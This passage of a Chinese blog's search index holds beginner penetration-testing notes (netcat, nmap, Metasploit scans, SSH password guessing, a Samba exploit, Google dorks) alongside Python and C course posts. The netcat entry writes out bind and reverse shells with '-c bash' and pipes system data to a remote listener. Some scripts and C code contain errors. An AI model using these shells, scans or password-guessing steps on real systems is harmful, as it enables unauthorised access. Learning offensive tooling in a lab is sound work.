USER——AGENT Proxy Workspace Snapshot Show schema Help Query 数据库 Select * from hosts where host like ‘%baidu.com%’ order by ip_address DNS查询 解析IP地址 联系人 报告 API]]></content>
  </entry>
  <entry>
    <title><![CDATA[网络数据包分析工具]]></title>
    <url>%2F2018%2F01%2F29%2F%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Wireshark 抓包嗅探协议分析 抓包引擎 Libpcap9 – Linux Winpcap10 – Windows 解码能力 Wireshark 基本使用方法 启动 选择抓包网卡 混杂模式 实时抓包 保存和分析捕获文件 首选项 开启混杂模式，抓取所有数据包。 抓包筛选器 ip 192.168.0.1 只抓取一个IP地址的数据包 Wireshark– 常见协议包 ARP SSDP 就不列举了，需要单独花一些时间仔细研究一下常见协议的网络包 小细节Wireshark是按端口来区分协议的，所以如果没有用常用端口的协议，可以手动更改一下解析方式。 通过数据流查看方式查看类似html流量 通过ssl证书加密协议就无法识别内容了，但是在开头还是有明文证书信息，虽然没什么用。 TCPDUMP No-GUI 的抓包分析工具 Linux\ Unix系统默认安装 抓包 默认只抓68个字节 tcpdump -i eth0 -s 0 -w file.pcap -s 0 有多大抓多大 Tcpdump -i eth0 port 22 抓22端口 读取抓包文件Tcpdump -r file.pcap -X 16进制显示 筛选tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -U -n 不解析域名 -r 读取文件 筛选第三列 去除重复项 tcpdump -n src host 145.254.160.237 -r http.cap 筛选源IP tcpdump -n dst host 145.254.160.237 -r http.cap 筛选目标IP tcpdump -n port 53 -r http.cap 按端口号筛选 tcpdump -nX port 80 -r http.cap 以十六进制显示数据包 高级筛选tcpdump -A -n &#39;tcp[13] = 24&#39; -r http.cap 过程文档记录 Dradis 短期临时小团队资源共享 各种插件导入文件 Keepnot Truecrypt]]></content>
  </entry>
  <entry>
    <title><![CDATA[NETCAT]]></title>
    <url>%2F2018%2F01%2F29%2FNetcat%2F</url>
    <content type="text"><![CDATA[Nc Wireshark Tcpdump NC 简介 身材小巧，能力强 侦听模式\传输模式 telent/获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 NC——TELNET/BANNER nc -nv 1.1.1.1 110 nc -nv 1.1.1.1 25 nc -nv 1.1.1.1 80 nc -h 查询参数使用 12345678910111213141516171819202122232425262728[v1.10-41.1]connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port]options: -c shell commands as `-e&apos;; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts -g gateway source-routing hop point[s], up to 8 -G num source-routing pointer: 4, 8, 12, ... -h this cruft -i secs delay interval for lines sent, ports scanned -k set keepalive option on socket -l listen mode, for inbound connects -n numeric-only IP addresses, no DNS -o file hex dump of traffic -p port local port number -r randomize local and remote ports -q secs quit after EOF on stdin and delay of secs -s addr local source address -T tos set Type Of Service -t answer TELNET negotiation -u UDP mode -v verbose [use twice to be more verbose] -w secs timeout for connects and final net reads -C Send CRLF as line-ending -z zero-I/O mode [used for scanning]port numbers can be individual or ranges: lo-hi [inclusive];hyphens in port names must be backslash escaped (e.g. &apos;ftp\-data&apos;). -v 显示详细连接信息 n 不做DNS解析 1234ping pop3.163.comnc -vn 220.181.12.110 110(UNKNOWN) [220.181.12.110] 110 (pop3) open+OK Welcome to coremail Mail Pop3 Server (163coms[b62aaa251425b4be4eaec4ab4744cf47s]) base64 邮箱地址 Ctrl+D USER base64地址 1234ping smtp.163.comnc -vn 220.181.12.16ehlo 用户名AUTH LOGIN 不用BASE64 ​ 123nc -vn 10.10.10.129 80get head ​ NC—— 传输文本信息开了两台虚拟机 A:nc -l -p 4444 打开侦听端口 B:nc -nv 1.1.1.1 4444 1234nc -l -p 333netstat -pantu | grep 333 查看端口是否开启另一台机器nc -nv 10.10.10.133 333 远程信息收集 ls -l | nc -nv 10.10.10.133 可以在远端电脑上 nc -l -p 333 &gt; 1.txt 需要审计电脑 ps aux | nc -nv 10.10.10.133 -q 1 -q 命令执行完成 1秒自动断开连接 表明任务完成 lsof | nc -nv 10.10.10.133 -q 1 NC——传输文件、目录 传输文件 A： nc -lp 333 &gt; 1.mp4 B: nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1 或 A:nc -q 1 -lp 333 &lt; a.mp4 B:nc -nv 1.1.1.1 333 &gt; 2.mp4 传输目录 A：tar -cvf - music | nc -lp 333 -q 1 先打包 再传输 B: nc -nv 1.1.1.1 333 | tar -xvf - 加密传文件 A：nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 B: mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4| nc -nv 1.1.1.1 333 -q 1 NC——流媒体服务器 A: cat 1.mp4 | nc -lp 333 B : nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 - NC——端口扫描nc -nvz 1.1.1.1 1-65535 tcp端口 nc -vnzu 1.1.1.1 1-1024 udp端口 NC—— 远程克隆硬盘 A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1 远程电子取证，可以将目标服务器硬盘远程复制 NC——远程控制 正向 A:nc -lp 333 -c bash B:nc 1.1.1.1 333 反向 A: nc -lp 333 B: nc 1.1.1.1 333 -c bash windows用户把bash改成cmd NC 缺点 Nc缺乏加密和身份验证的能力 Ncat包含于nmap工具包中 A： ncat -c bash --alllow 192.168.20.14 -vnl 333 --ssl B:ncat -nv 192.168.1.115 333 --ssl]]></content>
  </entry>
  <entry>
    <title><![CDATA[基础扫描]]></title>
    <url>%2F2018%2F01%2F28%2F%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[记录一下主动信息搜集的基础扫描方法 最基础的就是ping,在Metasploit中还有arp_sweep udp_sweep 等，但是我没有测试成功。 Nmap进行扫描nmap &lt;扫描选项&gt; &lt;扫描目标&gt; -sT TCP connect 扫描， 类似tcp模块 -sP 通过发送ICMP echo请求探测主机是否存活，原理同Ping -sU 探测目标主机开放了哪些UDP端口 -sA TCP ACK 扫描，类似ACK扫描模块 -sS 使用它来执行一次隐秘的TCP扫描，以确定某个特定的TCP端口是否开放，类似syn。 -Pn 不使用ping命令预先判断主机是否存活，而是默认所有主机都是存活状态。 -A 尝试深入的服务枚举和旗标获取。 -O 让Nmap对目标的操作系统进行识别 -F 快速扫描模式， 只扫描nmap-services中列出的端口 p&lt;端口范围&gt; Metasploit 辅助扫描模块search portscan ack: 通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测。 ftpbounce: 通过FTP bounce攻击的原理对TCP服务进行枚举。 syn: 使用发送TCP SYN标志的方式探测开放的端口 tcp: 通过一次完整的TCP连接来判断端口是否开放，扫描最准确，但速度最慢。 xmas:更为隐蔽的扫描方式，通过发送FIN、PSH和URG标志，躲避一些高级的TCP标记检测器的过滤。 1234use auxiliary/scanner/portscan/synset RHOSTS 10.10.10.254set THREADS 20run 一次使用syn扫描的过程。 常见的网络服务扫描1.Telnet服务扫描 1234use auxiliary/scanner/telnet/telnet_versionset RHOSTS 10.10.10.0/24set THREADS 100run 2.SSH服务扫描 123use auxiliary/scanner/ssh/ssh_versionset RHOSTS 10.10.10.0/24run 3.Oracle数据库服务查点 123use auxiliary/scanner/oracle/tnslsnr_versionset RHOSTS 10.10.10.0/24run 4.服务器消息块协议扫描 获取Windows系统的版本号 1234use scanner/smb/smb_versionshow optionsset RHOSTSrun 5.搜寻配置不当的Microsoft SQL Server 1234use scanner/mssql/mssql_pingshow optionsset RHOSTSrun 6.FTP 扫描 1234use scanner/ftp/ftp_versionshow optionsset RHOSTS run 7.简单网管协议(SNMP)扫描 123use scanner/snmp/snmp_loginset RHOSTSrun 口令猜测和嗅探 SSH服务口令猜测 use auxiliary/scanner/ssh/ssh_login 载入ssh_login模块后， 设置RHOSTS参数指定口令攻击对象，使用USERNAME参数指定一个用户名，或者使用USER_FILE参数指定一个包含多个用户名的文本文件，每个用户名占一行。并使用PASSWORD指定一个特定的口令字符串，或者使用PASS_FILE参数指定一个包含多个口令的字典文件，每个口令占一行。 也可以使用USERPASS_FILE指定一个用户名和口令的配对文件(用户名和口令之间用空格隔开，每对用户名口令占一行) psnuffle口令嗅探 截获常见协议的身份认证过程。 use auxiliary/sniffer/psnuffle]]></content>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-入门]]></title>
    <url>%2F2018%2F01%2F27%2FMetasploit-%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Metasploit是一个超级强大的工具，我通过Kali Linux直接使用，就省略了安装过程。 图形化界面工具早上在用BT的时候，是可以使用msfgui的。但是在Kali里已经没有了。相应的图形界面好像是Armitage.只是打开看了一下，没有仔细研究。 msfconsole控制台终端msfconsole 启动之后，可以输入help命令列出所支持的命令列表。 help search search samba use multi/samba/usermap_script show payloads set payload cmd/unix/bind_netcat show options set RHOST 10.10.10.254 exploit 通过上面就可以实施渗透攻击了。 uname -a whoami 即可验证]]></content>
  </entry>
  <entry>
    <title><![CDATA[外围信息搜集]]></title>
    <url>%2F2018%2F01%2F27%2F%E5%A4%96%E5%9B%B4%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[外围信息搜集又称为公开渠道信息搜集，以前在qlcoder里见过几道题是与之相关的，那么今天正好学习一下。 英文 OSINT(Open Source INTelligence)https://en.wikipedia.org/wiki/Open-source_intelligence 以书中的testfire.net网站为例。 通过DNS和IP地址挖掘目标网络信息1.whois域名注册信息查询 这个可以通过msf命令whois testfire.net 来查询。 查询域名注册信息，包括域名所有者，服务商，管理员邮件地址，域名注册日期和过期日期。 进行查询应该去掉www、ftp前缀，机构在注册域名时通常会注册一个上层域名，其子域名由自身的域名服务器管理。 2.nslookup与dig域名查询 两个工具都用来查询指定域名所对应的IP地址，dig工具从该域名的官方DNS服务器上查询到精确的权威解答，uslookup得到DNS解析服务器保存在Cache中的非权威解答。 123nslookupset type=Atestfire.net 还可以使用set type=MX 来查找其邮件转发。 dig 1dig @ns.watson.ibm.com testfire.net 可以指定DNS服务器进行查询。 可以在待查询域名后面加上A NS MX等选项以查找特定类型的DNS记录（默认为A) 3.IP2Location地理位置查询 这个就是通过IP地址寻找其地理位置。 4.netcraft网站提供的信息查询服务 https://searchdns.netcraft.com/ 查询子站点。 5.IP2Domain 反查域名 这个可以通过一些网站来通过IP反查域名。 通过搜索引擎进行信息收集1.Google Hacking SiteDigger Search Diggity 这两个工具还没有使用过。 2.探索网站的目录结构 google parent directory site:testfire.net 扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名、口令等。 扩展名为bak的文件，通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。 扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息。 3.检索特定类型的文件 Googlesite:testfire.net filetype:xls 4.搜索网站中的E-mail地址 5.搜索易存在SQL注入点的页面 site:testfire.net inurl:login]]></content>
  </entry>
  <entry>
    <title><![CDATA[Kali-Linux-基本配置]]></title>
    <url>%2F2018%2F01%2F25%2FKali-Linux-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[网络配置 临时IP地址 ifconfig eth0 192.168.1.10/24 修改IP地址/掩码 route add default gw 192.168.1.1 指定网关 netstat -nr 查看网关情况 route add -net 172.16.0.0/24 gw 192.168.1.100 eth0 添加静态路由 vi /etc/resolv.conf 直接修改DNS服务器 nameserver 8.8.8.8 vi /etc/network/interfaces 网卡配置文件 123456iface eth0 inet staticaddress 192.168.0.1netmask 255.255.255.0gateway 192.168.0.254dns-nameservers 192.168.1.1配置静态地址 ​ 更新升级 apt-get update apt-get upgrade vi /etc/apt/sources.list 换源 12345#deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib#deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib#deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-freedeb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib apt-get dis-upgrade 大版本更新 安装软件包apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y firefox浏览器插件 flashgot 、autoproxy 、Tamper Data 、cookie importer、Cookies Manager、User AgentSwitcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、Flagfox、hashrhttps://addons.mozilla.org/en-US/firefox/addon/xss-me/https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss 安装JAVA 下载http://java.sun.com/javase/downloads/index.jsp解包拷⻉tar -xzvf /root/jdk-7u45-linux-x64.tar.gzmv jdk1.7.0_45 /optcd /opt/jdk1.7.0_45安装注册update-alternatives --install /usr/bin/java java /opt/jdk1.7.0_45/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.7.0_45/bin/javac 1 update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so 1默认设置update-alternatives --set java /opt/jdk1.7.0_45/bin/javaupdate-alternatives --set javac /opt/jdk1.7.0_45/bin/javacupdate-alternatives --set mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so验证java –versionhttp://www.java.com/en/download/installed.jsp 安装显卡驱动•GPU的⽤用途•Nvidia•Ati•Nvidia显卡驱动安装•apt-get updateapt-get dist-upgradeapt-get install -y linux-headers-$(uname -r)apt-get install nvidia-kernel-dkms•sed ‘s/quiet/quiet nouveau.modeset=0/g’ -i /etc/default/grubupdate-grubreboot•验证：•glxinfo | grep -i “direct rendering“•direct rendering: Yes 并发线程限制•Ulimite⽤用于限制当前 shell 内进程的资源使⽤用•查看默认值•Ulimite –a•全局配置⽂文件 ：/etc/security/limits• •⽤用途距离•限制⽂文件块⼤大⼩小：ulimit – s 100•限制shell内存使⽤用：ulimit -m 5000 -v 5000•没有直接对socket数量的限制参数•Linux系统中⼀一切都是⽂文件，运⾏行中的⽂文件叫做进程•ulimite –n 800000 服务开关•Kali Linux默认未启动所有⺴⽹网络服务•update-rc.d ssh default•/etc/init.d/ssh start]]></content>
  </entry>
  <entry>
    <title><![CDATA[kali-linux-虚拟机安装]]></title>
    <url>%2F2018%2F01%2F24%2Fkali-linux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[安装一直想玩一下kali linux, 之前一直没有时间。今天重新下载开始了折腾过程，顺便开始自己的渗透测试学习之路。 我选择通过VBOX来安装，官方网站上直接有VBOX的镜像，所以很方便。 下载地址：https://www.kali.org/downloads/ 然后呢，在VBOX上运行这个镜像需要安装一个增强。 下载一个叫Oracle_VM_VirtualBox_Extension_Pack的东西双击安装就好了。 成功运行之后，因为Kali Linux的Root用户策略。所以用户是root，密码是toor就可以进入系统了。 接下来就是安装Vbox的增强功能。 在光盘挂载之后，可以把VboxLinuxAdditions.run文件放到容易启动终端的目录下。 启动终端之后可以增加文件的运行权限。chmod +x VBoxLinuxAdditions.run 然后运行安装即可。./ VBoxLinuxAdditions.run 想试一下持久加密USB安装来着，但是身边没有U盘。就等以后有机会了。 命令BShell 下，蓝色代表普通目录，白色代表普通文件，绿色代表可执行文件，红色代表压缩包文件。 ls命令 ls -l 长格式 第一个字符d代表目录 -代表文件 c表示设备 l表示链接 b表示块 -a 显示隐藏参数 -lh 容易读文件大小 --sort=time 按时间排序 --sort=size 按大小排序 cd 命令 cd ..上级目录 pwd查看当前目录 cat 查看内容 more 方便查看前部内容 less tail 默认显示最后十行内容 tail -20 查看最后20行 watch -n 2 tail -20 /var/log/messages 每隔 两秒 刷新 var/log/messages rm 删除文件 cp 拷贝文件 cp -r Agent/ A 复制Agent文件夹 ，新文件夹名为A rm -r A 删除A文件夹 top命令 监视系统性能 kill来终结进程 ps 进程信息 ps -ef 详细进程信息 ps aux grep 筛选显示内容 ipconfig 查看网络信息 ifconfig eth0 down 关闭网卡 macchanger -m 00:11:11:11:11:11 eth0 修改mac地址 ifconfig eth0 up netstat 查看网络连接信息 netstat -pantu netstat -pantu | egrep -v &#39;0.0.0.0|::: | awk &#39;{print $5}&#39; netstat -pantu | egrep -v &#39;0.0.0.0|::: | awk &#39;{print $5}&#39; | egrep -v &#39;and|Address&#39; | cut -d &#39;:&#39; -f 1 | sort | uniq &gt; ip &gt;&gt;不覆盖之前文件 mount 挂载命令 mount -o loop kali.iso /media/cdrom dmesg 查看message find 查找文件 find / -iname nmap 不区分大小写查找nmap find . -name &quot;ps*&quot; find . -name &quot;ps*&quot; -exec cp {} /tmp/{} .bak \; whereis echo 显示信息 cd aaa &amp; ls 先后依次执行 &amp;&amp; 如果前面命令成功才执行之后命令 || 如果前面命令不成功才执行之后命令 Shell脚本vi 1.sh 1234#! /bin/bashecho .n "IP: "read ipecho "your ip is :" $ip chmod +x 1.sh ./1.sh 99.sh 123456789#! /bin/bashfor n in 'seq 9'do for m in 'seq $n' do echo -n "$m*$n="`expr $m \* $n`"" done echodone ping.sh 12345#! /bin/bashfor n in 'seq 254'do ping 192.168.1.$n -c 1 | grep ttl | awk '&#123;print $4&#125;' | awk -F: '&#123;print $1&#125;'done s1.sh 1234567891011#! /bin/bashA='cat ip1'for B in $Ado n='echo $B | wc -L' if [ $n -gt 6] ; then ip=$B else port=$B namp -p$port -sV $ip | grep -v Starting | grep -v Host | grep -v PORT | grep -v Service | grep -v done &gt;&gt; r1done]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python 将手机照片拍摄地点可视化]]></title>
    <url>%2F2018%2F01%2F10%2FPython%20%E5%B0%86%E6%89%8B%E6%9C%BA%E7%85%A7%E7%89%87%E6%8B%8D%E6%91%84%E5%9C%B0%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96%2F</url>
    <content type="text"><![CDATA[今天发现自己手机里所有的照片的EXIF信息中都有GPS信息。 所以有将数据可视化的想法，想着比较简单，但还是有很多坑在里面。 首先需要读取图片的GPS信息。 Exifread 库 https://pypi.python.org/pypi/ExifRead 读取GPS信息 https://gist.github.com/snakeye/fdc372dbf11370fe29eb 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import exifread# based on https://gist.github.com/erans/983821def _get_if_exist(data, key): if key in data: return data[key] return Nonedef _convert_to_degress(value): """ Helper function to convert the GPS coordinates stored in the EXIF to degress in float format :param value: :type value: exifread.utils.Ratio :rtype: float """ d = float(value.values[0].num) / float(value.values[0].den) m = float(value.values[1].num) / float(value.values[1].den) s = float(value.values[2].num) / float(value.values[2].den) return d + (m / 60.0) + (s / 3600.0) def get_exif_location(exif_data): """ Returns the latitude and longitude, if available, from the provided exif_data (obtained through get_exif_data above) """ lat = None lon = None gps_latitude = _get_if_exist(exif_data, 'GPS GPSLatitude') gps_latitude_ref = _get_if_exist(exif_data, 'GPS GPSLatitudeRef') gps_longitude = _get_if_exist(exif_data, 'GPS GPSLongitude') gps_longitude_ref = _get_if_exist(exif_data, 'GPS GPSLongitudeRef') if gps_latitude and gps_latitude_ref and gps_longitude and gps_longitude_ref: lat = _convert_to_degress(gps_latitude) if gps_latitude_ref.values[0] != 'N': lat = 0 - lat lon = _convert_to_degress(gps_longitude) if gps_longitude_ref.values[0] != 'E': lon = 0 - lon return lat, lon 最后代码 输入文件夹路径，数据可视化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import osimport exifreadimport plotly.plotly as py from plotly.graph_objs import *mapbox_access_token = '####'def _get_if_exist(data, key): if key in data: return data[key] return Nonedef _convert_to_degress(value): """ Helper function to convert the GPS coordinates stored in the EXIF to degress in float format :param value: :type value: exifread.utils.Ratio :rtype: float """ d = float(value.values[0].num) / float(value.values[0].den) m = float(value.values[1].num) / float(value.values[1].den) s = float(value.values[2].num) / float(value.values[2].den) return d + (m / 60.0) + (s / 3600.0) def get_exif_location(exif_data): """ Returns the latitude and longitude, if available, from the provided exif_data (obtained through get_exif_data above) """ lat = None lon = None gps_latitude = _get_if_exist(exif_data, 'GPS GPSLatitude') gps_latitude_ref = _get_if_exist(exif_data, 'GPS GPSLatitudeRef') gps_longitude = _get_if_exist(exif_data, 'GPS GPSLongitude') gps_longitude_ref = _get_if_exist(exif_data, 'GPS GPSLongitudeRef') if gps_latitude and gps_latitude_ref and gps_longitude and gps_longitude_ref: lat = _convert_to_degress(gps_latitude) if gps_latitude_ref.values[0] != 'N': lat = 0 - lat lon = _convert_to_degress(gps_longitude) if gps_longitude_ref.values[0] != 'E': lon = 0 - lon return lat, londirname = input()lat1 = []lon1 = []text1 = [] for filename in os.listdir(dirname): path = dirname + filename #if os.path.isdir(path): #print(path) # path += '/' f = open(path,'rb') tags = exifread.process_file(f) print(get_exif_location(tags)) lat1.append(get_exif_location(tags)[0]) lon1.append(get_exif_location(tags)[1]) text1.append(filename)print(lat1)print(lon1)data = Data([ Scattermapbox( lat = lat1, lon = lon1, mode='markers', marker=Marker( size=9 ), text = text1, )])layout = Layout( autosize=True, hovermode='closest', mapbox=dict( accesstoken=mapbox_access_token, bearing=0, center=dict( lat=31.21, lon=121.46 ), pitch=0, zoom=10 ),)fig = dict(data=data, layout=layout)py.plot(fig, filename='Multiple Mapbox') 主要是用了Plotly服务 还有需要在绘制地图之前在mapbox网站上获取一个Token 官方网址https://plot.ly/python/scattermapbox/ 一个小坑 https://stackoverflow.com/questions/34929778/keyerror-plotly-domain-when-using-plotly-to-do-scatter-plot-in-python 12use py.plot instead of py.iplot. Have a try.This works splendidly. iplot works with a Jupyter notebook (previously IPython notebook). 感觉这个东西作为作业实在是太水了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[一次python的神奇bug]]></title>
    <url>%2F2017%2F12%2F01%2F%E4%B8%80%E6%AC%A1python%E7%9A%84%E7%A5%9E%E5%A5%87bug%2F</url>
    <content type="text"><![CDATA[事情的缘由很简单，在做一道水题的时候卡题了。大半年前用C 写过的题，怎么用python就怎么也过不了了勒。而且错误提示还是RUNTIME ERROR在折腾的过程中发现了一些有趣的问题。12345for i in range(97, 123): dict[chr(i)] = list1[j] dict[chr(i - 32)] = list1[i] j += 1list2 = sorted(dict.items(), key = lambda item: item[1], reverse = True) 我理所当然的以为创建字典的先后顺序会被保留下来，当然之前也知道字典是无序的，为啥当时就没当回事。这段代码在win下和linux下跑起来结果不一样，我还误以为是win和linux的系统差别，但其实是字典的无序性决定的。那么字典为啥无序勒，就是取决于实现字典的数据结构，字典通过Hash Table来实现。那么具体实现方法在算法导论第十一章，今天晚上还没有仔细看。但是其中的内容肯定拿出来不止写一篇文章啦。 第二个问题就是导致RUNTIME ERROR的问题。现在搞明白了我可以阐述一下问题产生的原因。首先明白一件事情，不同操作系统表示换行符是不同的，可以通过Notepad++轻松看出来。Win的换行符是\n\r Linux的换行符是\n Mac 的换行符是\r 我是在win下先写的python文件，然后拖到了Linux的虚拟机里面。如果从Linux的虚拟机里面复制东西，虚拟机会在末尾加上\r，以免出现错误。但是我此时在Linux里的文件已经是\n\r了，这时复制出来就会每行末尾多出\r。导致每行末尾变成四不像。就无法在OJ上正常运行啦。 周三晚上碰到的问题今天就全部解决了。也是长了知识。]]></content>
  </entry>
  <entry>
    <title><![CDATA[15-213-Linux/Git-Bootcamp]]></title>
    <url>%2F2017%2F11%2F29%2F15-213-Linux-Git-Bootcamp%2F</url>
    <content type="text"><![CDATA[这个实验我觉得非常好。123456Outline1. Getting connected to the shark machines2. Transferring files between your computer and the shark machines3. Exploring and organizing your files on the shark machines4. Editing files and building code on the shark machines5. Using git to save your work history Getting Connected是用KiTTY 用ssh连接 shark machines Transferring Files用FileZilla 通过ftp方式传输文件。 Exploring the File System一些简单的linux命令 Editing Files and Building Code用vim 编辑代码。还讲了编辑 vimrc文件。 Introduction to Git从零开始的入门介绍，包括key的配置，想想自己以前折腾的…唉]]></content>
  </entry>
  <entry>
    <title><![CDATA[15-213-Lab0]]></title>
    <url>%2F2017%2F11%2F29%2F15-213-Lab0%2F</url>
    <content type="text"><![CDATA[15-213 Lab0这个实验是C语言编写链表，很久没用用过C语言，还是用了很长时间做完这个实验，期间还碰到了喜闻乐见segmentation fault，好像是因为打错某些东西发生的。最后一个问题链表反转是通过查资料搞定的，以前没见过，发现还是经典面试题之一。 放代码 queue.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164/* * Code for basic C skills diagnostic. * Developed for courses 15-213/18-213/15-513 by R. E. Bryant, 2017 *//* * This program implements a queue supporting both FIFO and LIFO * operations. * * It uses a singly-linked list to represent the set of queue elements */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include "harness.h"#include "queue.h"/* Create empty queue. Return NULL if could not allocate space.*/queue_t *q_new()&#123; queue_t *q = malloc(sizeof(queue_t)); if(q == NULL) return NULL; q-&gt;tail = NULL; /* What if malloc returned NULL? */ q-&gt;head = NULL; q-&gt;size=0; return q;&#125;/* Free all storage used by queue */void q_free(queue_t *q)&#123; if(q == NULL) return ; /* How about freeing the list elements? */ /* Free queue structure */ list_ele_t *P; list_ele_t *Tmp; P = q-&gt;head; q-&gt;head = NULL; while(P != NULL) &#123; Tmp = P-&gt;next; free(P); P = Tmp; &#125; free(q);&#125;/* Attempt to insert element at head of queue. Return true if successful. Return false if q is NULL or could not allocate space. */bool q_insert_head(queue_t *q, int v)&#123; list_ele_t *newh; if(q == NULL) return false; /* What should you do if the q is NULL? */ newh = malloc(sizeof(list_ele_t)); /* What if malloc returned NULL? */ if((newh == NULL)) return false; newh-&gt;value = v; newh-&gt;next = NULL; newh-&gt;next = q-&gt;head; if(q-&gt;size == 0) q-&gt;tail = newh; q-&gt;head = newh; q-&gt;size += 1; return true;&#125;/* Attempt to insert element at tail of queue. Return true if successful. Return false if q is NULL or could not allocate space. */bool q_insert_tail(queue_t *q, int v)&#123; /* You need to write the complete code for this function */ /* Remember: It should operate in O(1) time */ list_ele_t *newh; newh = malloc(sizeof(list_ele_t)); if(q == NULL || newh == NULL) return false; newh-&gt;value = v; newh-&gt;next = NULL; q-&gt;tail-&gt;next = newh; q-&gt;tail = newh; q-&gt;size += 1; return true;&#125;/* Attempt to remove element from head of queue. Return true if successful. Return false if queue is NULL or empty. If vp non-NULL and element removed, store removed value at *vp. Any unused storage should be freed*/bool q_remove_head(queue_t *q, int *vp)&#123; /* You need to fix up this code. */ if(q == NULL || q-&gt;head == NULL) return false; list_ele_t *tmp; tmp = q-&gt;head; if(vp != NULL) *vp = tmp-&gt;value; q-&gt;head = tmp-&gt;next; free(tmp); q-&gt;size -= 1; return true;&#125;/* Return number of elements in queue. Return 0 if q is NULL or empty */int q_size(queue_t *q)&#123; /* You need to write the code for this function */ /* Remember: It should operate in O(1) time */ if(q == NULL || q-&gt;head == NULL) return 0; else return q-&gt;size;&#125;/* Reverse elements in queue. Your implementation must not allocate or free any elements (e.g., by calling q_insert_head or q_remove_head). Instead, it should modify the pointers in the existing data structure. */void q_reverse(queue_t *q)&#123; if (q == NULL || q-&gt;size ==0) return ; list_ele_t *end = q-&gt;tail; list_ele_t *p = q-&gt;head; bool tag = false; while(q-&gt;head != end)&#123; q-&gt;head = q-&gt;head-&gt;next; p-&gt;next = end-&gt;next; end-&gt;next = p; if(!tag)&#123; q-&gt;tail = p; tag = true; &#125; p = q-&gt;head; &#125; /* You need to write the code for this function */&#125; queue.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980/* * Code for basic C skills diagnostic. * Developed for courses 15-213/18-213/15-513 by R. E. Bryant, 2017 *//* * This program implements a queue supporting both FIFO and LIFO * operations. * * It uses a singly-linked list to represent the set of queue elements */#include &lt;stdbool.h&gt;/************** Data structure declarations ****************//* Linked list element (You shouldn't need to change this) */typedef struct ELE &#123; int value; struct ELE *next;&#125; list_ele_t;/* Queue structure */typedef struct &#123; list_ele_t *head; /* Linked list of elements */ int size = 0; /* You will need to add more fields to this structure to efficiently implement q_size and q_insert_tail */&#125; queue_t;/************** Operations on queue ************************//* Create empty queue. Return NULL if could not allocate space.*/queue_t *q_new();/* Free all storage used by queue. No effect if q is NULL*/void q_free(queue_t *q);/* Attempt to insert element at head of queue. Return true if successful. Return false if q is NULL or could not allocate space. */bool q_insert_head(queue_t *q, int v);/* Attempt to insert element at tail of queue. Return true if successful. Return false if q is NULL or could not allocate space. */bool q_insert_tail(queue_t *q, int v);/* Attempt to remove element from head of queue. Return true if successful. Return false if queue is NULL or empty. If vp non-NULL and element removed, store removed value at *vp. Any unused storage should be freed*/bool q_remove_head(queue_t *q, int *vp);/* Return number of elements in queue. Return 0 if q is NULL or empty */int q_size(queue_t *q);/* Reverse elements in queue No effect if q is NULL or empty */ http://blog.csdn.net/feliciafay/article/details/6841115单链表的反转]]></content>
  </entry>
  <entry>
    <title><![CDATA[vim的插件折腾]]></title>
    <url>%2F2017%2F11%2F27%2Fvim%E7%9A%84%E6%8F%92%E4%BB%B6%E6%8A%98%E8%85%BE%2F</url>
